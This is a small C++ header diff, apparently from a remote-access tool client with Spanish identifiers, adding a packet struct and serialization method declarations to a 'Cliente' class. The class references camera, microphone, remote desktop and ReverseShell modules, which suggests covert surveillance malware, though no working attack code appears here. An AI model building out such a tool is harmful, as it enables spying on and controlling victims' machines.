@@ -7,6 +7,12 @@
 #include "mod_camara.hpp"
 #include "mod_remote_desktop.hpp"
 
+struct Paquete {
+	u_int uiTipoPaquete;
+	u_int uiTamBuffer;
+	u_int uiIsUltimo;
+	char cBuffer[PAQUETE_BUFFER_SIZE];
+};
 
 class ReverseShell;
 class Mod_Mic;
@@ -108,6 +114,8 @@ class Cliente {
 		//Socket wraps
 		int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code);
 		int cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code);
+		void m_SerializarPaquete(const Paquete& paquete, char* cBuffer);
+		void m_DeserializarPaquete(const char* cBuffer, Paquete& paquete);
 
 
 		//AES
